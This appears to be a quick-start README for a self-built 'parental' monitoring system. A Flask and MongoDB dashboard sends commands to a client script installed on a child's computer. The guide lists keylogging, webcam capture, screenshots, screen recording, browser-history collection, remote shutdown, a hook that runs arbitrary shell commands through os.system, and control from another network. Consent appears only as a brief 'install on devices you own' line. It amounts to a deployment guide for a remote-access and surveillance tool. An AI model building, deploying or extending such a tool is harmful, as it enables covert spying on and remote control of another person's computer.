# 🚀 QUICK START GUIDE - 5 Minutes Setup

## What's New?
- ✅ **Website Dashboard** instead of Telegram
- ✅ **MongoDB Database** for storing data
- ✅ **No more Telegram API** - Full control
- ✅ **Beautiful UI** with real-time updates

---

## STEP 1: Install Prerequisites (5 minutes)

### Option A: Local MongoDB (Recommended for Testing)
1. Download: https://www.mongodb.com/try/download/community
2. Install with default settings
3. MongoDB auto-runs on `localhost:27017`

### Option B: Cloud MongoDB (Recommended for Production)
1. Go to: https://www.mongodb.com/cloud/atlas
2. Sign up (free tier available)
3. Create a cluster
4. Get connection string
5. Copy connection string and update in files

---

## STEP 2: Quick Installation

### On Your Computer:
```bash
cd c:\Users\ronit\Desktop\techshurujan_2026

# Install Python packages
python -m pip install --upgrade pip
pip install -r requirements.txt

# Or just run:
install.bat
```

---

## STEP 3: Run the System

### Terminal 1 - Start MongoDB (if using local)
```bash
mongod
```
Leave this running in background.

### Terminal 2 - Start Server
```bash
cd c:\Users\ronit\Desktop\techshurujan_2026
python backend.py
```

You should see:
```
 * Running on http://127.0.0.1:5000
```

✅ Server is now running!

### Terminal 3 - Open Dashboard
Open your browser:
```
http://localhost:5000
```

You should see the beautiful dashboard!

### Terminal 4 - Install & Run Client
On the **child's computer**, run:
```bash
cd c:\path\to\techshurujan_2026
python client.py
```

---

## STEP 4: Test the System

1. **In dashboard**, refresh and you should see the device appear
2. Click on the device card
3. Click **PC Info** button
4. Check the results appear in the output

---

## HOW WEBSITE CONTROLS FILES:

### Simple Explanation:

```
YOU (Parent)              WEBSITE              MONGODB              CHILD'S PC
    |                        |                    |                      |
    +-----Click Button-----→ | Takes screenshot   |                      |
    |                        +--Store command---→ | Polls database       |
    |                        |                    +--Finds command------→ |
    |                        |                    |  Takes screenshot    |
    |                        |                    | ←-Returns result-----+
    |                        | ←-Fetch result-----+                      |
    | ←-Show image-----------+                    |                      |
    |                        |                    |                      |
```

### What Happens When You Click "Screenshot":

1. **You click button** on website
2. **Flask backend** creates command in MongoDB: `{ device_id: "...", command: "screenshot", status: "pending" }`
3. **Client script** polls database every 5 seconds, finds pending command
4. **Client executes** `pyautogui.screenshot()` on child's computer
5. **Screenshot** stored in MongoDB as base64 image
6. **Website** fetches from MongoDB and displays to you

---

## FILE LOCATIONS:

```
c:\Users\ronit\Desktop\techshurujan_2026\
│
├── backend.py                    ← Start this first (server)
├── client.py                     ← Install on child's PC
├── templates/index.html          ← Website (auto-opens)
├── requirements.txt              ← Dependencies
├── install.bat                   ← Quick installer
├── README.md                     ← Full documentation
└── QUICKSTART.md                 ← This file
```

---

## AVAILABLE COMMANDS:

### Information Commands:
- **PC Info** - CPU, RAM, Disk, IP
- **Screenshot** - Capture screen
- **Webcam** - Capture webcam
- **Chrome History** - Last 20 websites visited
- **Record Screen** - Video of screen (specify seconds)

### Control Commands:
- **Lock** - Lock the desktop
- **Logout** - Log out user
- **Restart** - Restart computer
- **Shutdown** - Turn off computer

### Monitoring:
- **Start Keylogger** - Log all keystrokes
- **Stop Keylogger** - Stop logging

---

## REMOTE CONTROL (Control from Another Network)

### Find Your IP:
```bash
ipconfig
```
Look for IPv4 Address (e.g., 192.168.1.100)

### Edit Files:
1. **backend.py** - Already set to accept all IPs (0.0.0.0)
2. **client.py** - Line 9:
   ```python
   BACKEND_URL = "http://192.168.1.100:5000"  # Your IP
   ```

### Access from Another Computer:
```
http://192.168.1.100:5000
```

---

## DATABASE STRUCTURE:

### MongoDB Collections:

```javascript
// 1. devices - Registered computers
{
  device_id: "DESKTOP-ABC123",
  device_name: "John's Laptop",
  status: "online",
  last_seen: ISODate("2026-02-01T10:30:00Z")
}

// 2. commands - What you tell PC to do
{
  device_id: "DESKTOP-ABC123",
  command: "screenshot",
  status: "pending",
  executed: false,
  created_at: ISODate("2026-02-01T10:35:00Z")
}

// 3. results - Command results
{
  device_id: "DESKTOP-ABC123",
  command_id: ObjectId("..."),
  result: "Screenshot captured",
  success: true,
  created_at: ISODate("2026-02-01T10:35:05Z")
}

// 4. screenshots - Stored images
{
  device_id: "DESKTOP-ABC123",
  image_base64: "iVBORw0KGgoAAAANS...",  // Base64 encoded image
  created_at: ISODate("2026-02-01T10:35:05Z")
}

// 5. keystrokes - Logged keys
{
  device_id: "DESKTOP-ABC123",
  text: "hello world",
  created_at: ISODate("2026-02-01T10:35:15Z")
}
```

---

## COMMON ISSUES & FIXES:

### ❌ "Connection refused"
**Solution:** Make sure Flask server is running
```bash
python backend.py
```

### ❌ "MongoDB not found"
**Solution:** Start MongoDB first
```bash
mongod
```
Or use MongoDB Atlas (cloud)

### ❌ "Device not showing up"
**Solution:** Make sure client is running on child's PC
```bash
python client.py
```

### ❌ "Commands not executing"
**Solution:** Check both Python files have correct MongoDB URI

### ❌ "Port 5000 already in use"
**Solution:** Change port in backend.py:
```python
app.run(debug=True, host='0.0.0.0', port=5001)  # Use 5001
```

---

## NEXT LEVEL: CUSTOMIZATION

### Add Custom Command:

**1. Add to backend.py:**
```python
@app.route('/api/command/yourcommand', methods=['POST'])
def cmd_yourcommand():
    device_id = request.json.get('device_id')
    # Your code here
    return jsonify({"status": "success", "message": "Done!"})
```

**2. Add to index.html:**
```html
<button class="btn-primary" onclick="executeCommand('yourcommand')">Your Command</button>
```

**3. Add to client.py:**
```python
elif command_type == "yourcommand":
    # Execute your command
    os.system("your-command-here")
```

---

## IMPORTANT SECURITY NOTES:

⚠️ **This is very powerful - handle with care!**

1. **Only install on devices you own**
2. **Change MongoDB password** in production
3. **Use HTTPS** for production (add SSL certificate)
4. **Add authentication** to dashboard
5. **Keep passwords secret**

Example - Add password to dashboard:
```python
# In backend.py
import secrets
app.config['SECRET_KEY'] = secrets.token_hex(32)

# Require login
@app.before_request
def check_login():
    if 'logged_in' not in session and request.path not in ['/login', '/api/login']:
        return redirect('/login')
```

---

## SUPPORT:

### Stuck?
1. Check error message in terminal
2. Read README.md for full documentation
3. Google the error message
4. Check if all services are running

### Want to uninstall?
```bash
# Delete these files:
backend.py
client.py
templates/
requirements.txt
```

---

## READY TO GO!

Follow the STEP 1-4 above and you're all set!

**Enjoy your monitoring system!** 🎉

---

*Last Updated: 2026-02-01*
